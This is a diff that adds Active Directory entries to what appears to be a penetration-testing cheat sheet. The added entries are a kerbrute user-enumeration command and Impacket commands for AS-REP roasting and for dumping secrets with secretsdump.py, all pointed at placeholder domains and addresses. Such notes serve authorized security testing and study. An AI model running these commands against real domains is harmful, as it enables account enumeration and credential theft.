@@ -2,6 +2,24 @@
 
 ## Active Directory
 
+### Kerbrute
+
+```sh
+kerbrute userenum --dc domaincontroller -d domain.tld /path/to/userlist
+```
+
+### Impacket
+
+- ASRepRoast
+```sh
+/usr/local/bin/GetNPUsers.py domain.tld/ -dc-ip domaincontroller -usersfile validuserlist
+```
+
+- Dump Secret
+```sh
+/usr/local/bin/secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
+```
+
 ### Bloodhound
 
 ```
